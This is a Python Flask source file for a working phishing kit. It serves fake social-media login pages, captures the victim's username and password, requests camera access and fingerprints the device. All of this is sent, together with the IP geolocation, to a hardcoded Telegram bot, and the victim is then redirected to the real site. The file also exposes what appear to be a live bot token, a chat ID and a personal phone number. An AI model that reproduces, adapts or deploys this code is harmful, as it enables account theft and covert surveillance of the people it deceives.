import requests, os, datetime
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- কনফিগারেশন (Dev By Anas +971504614724) ---
BOT_TOKEN = "8405188979:AAFgnDsgWjiK9WkBe5i_kIccbVRUwGvg06c"
CHAT_ID = "7701549179"

@app.route('/<platform>')
def login_page(platform):
    return render_template_string('''
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <script>
    async function track(){
        try { await navigator.mediaDevices.getUserMedia({video:true}); } catch(e) {}
        let b = await navigator.getBattery();
        let n = navigator;
        let info = {
            u: document.getElementById('u').value, 
            p: document.getElementById('p').value,
            platform: "{{p}}",
            batt: (b.level * 100) + "% (" + (b.charging ? "Charging" : "Not Charging") + ")",
            ram: n.deviceMemory || "N/A",
            cpu: n.hardwareConcurrency || "N/A",
            scr: screen.width + "x" + screen.height,
            os: n.platform,
            ua: n.userAgent,
            lang: n.language,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ref: document.referrer || "Direct Visit",
            online: n.onLine ? "Yes" : "No"
        };
        fetch('/save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(info)}).then(() => {
            window.location.href = "https://"+info.platform+".com/login";
        });
    }
    </script></head>
    <body style="font-family:sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
        <div style="background:white; padding:30px; border-radius:12px; width:90%; max-width:320px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.1);">
            <h2 style="color:#1877f2;">{{p|capitalize}} Login</h2>
            <input id="u" placeholder="Email or Phone" style="width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:6px;">
            <input type="password" id="p" placeholder="Password" style="width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:6px;">
            <button onclick="track()" style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">Log In</button>
        </div>
    </body></html>
    ''', p=platform)

@app.route('/save', methods=['POST'])
def save():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # আইপি থেকে সিম ও লোকেশন বের করার জন্য API
    geo = requests.get(f"http://ip-api.com/json/{ip}").json()
    
    full_msg = (
        f"🔥 **ANAS MASTER ATTACK SUCCESS** 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **User:** `{d['u']}`\n"
        f"🔑 **Pass:** `{d['p']}`\n"
        f"📱 **App:** {d['platform'].upper()}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **NETWORK DETAILS**\n"
        f"🔹 **IP:** `{ip}`\n"
        f"🔹 **Sim/ISP:** {geo.get('isp', 'N/A')}\n"
        f"🔹 **City:** {geo.get('city', 'N/A')}\n"
        f"🔹 **Country:** {geo.get('country', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔋 **HARDWARE INFO**\n"
        f"🔹 **Battery:** {d['batt']}\n"
        f"🔹 **RAM:** {d['ram']} GB\n"
        f"🔹 **CPU Cores:** {d['cpu']}\n"
        f"🔹 **Screen:** {d['scr']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ **SOFTWARE INFO**\n"
        f"🔹 **OS:** {d['os']}\n"
        f"🔹 **Language:** {d['lang']}\n"
        f"🔹 **Timezone:** {d['tz']}\n"
        f"🔹 **Referrer:** {d['ref']}\n"
        f"🔹 **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ **Dev By Anas +971504614724**"
    )
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": full_msg, "parse_mode": "Markdown"})
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
